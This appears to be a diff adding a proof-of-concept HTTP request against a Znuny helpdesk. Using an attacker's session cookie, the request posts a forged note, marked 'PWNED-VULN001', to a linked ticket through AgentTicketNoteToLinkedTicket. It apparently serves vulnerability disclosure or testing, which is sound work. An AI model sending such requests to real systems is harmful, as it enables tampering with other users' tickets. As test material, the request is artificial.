@@ -1,0 +1,4 @@
+POST /znuny/index.pl HTTP/1.1
+Cookie: OTRSAgentInterface=<attacker>
+
+Action=AgentTicketNoteToLinkedTicket&Subaction=Store&TicketID=66&ChallengeToken=H2zdKs8QuEMZmzqI9ubaRCcXjrsPcAhn&LinkedTicketIDs=67&Subject=forged&Body=PWNED-VULN001-f908d36e
